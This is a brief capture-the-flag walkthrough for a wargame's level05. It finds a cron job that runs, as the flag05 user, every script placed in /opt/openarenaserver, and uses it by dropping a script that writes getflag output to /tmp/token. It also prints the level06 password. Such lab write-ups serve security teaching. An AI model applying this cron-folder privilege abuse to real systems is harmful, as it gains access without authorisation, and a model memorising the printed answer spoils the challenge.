Home is empty.
On loggon, a msg is printed "You have new mail."

		mail

	The program 'mail' is currently not installed.  To run 'mail' please ask your administrator to install the package 'mailutils'

mail is not installed, checking /var/mail/ is a file named level05.
		
		cat /var/mail/level05

	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

Seems that there is a cron job which executes the above command at every 2 minutes.
Let's see what contain the openarenaserver file

		cat /usr/sbin/openarenaserver

	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done

We can see a loop which iterate through all the files in opt/openarenaserver/ and evaluate them.

By putting a bash script in that folder we can make redirect getflag into a /tmp/flag file.
		
		#!/bin/bash
		/bin/getflag > /tmp/token


Change file modes by setting on execute bits.
		
		chmod +x /opt/openarenaserver/hack.sh
		cat /tmp/token
	
	Check flag.Here is your token : viuaaale9huek52boumoomioc

LEVEL06 PASSWORD: viuaaale9huek52boumoomioc
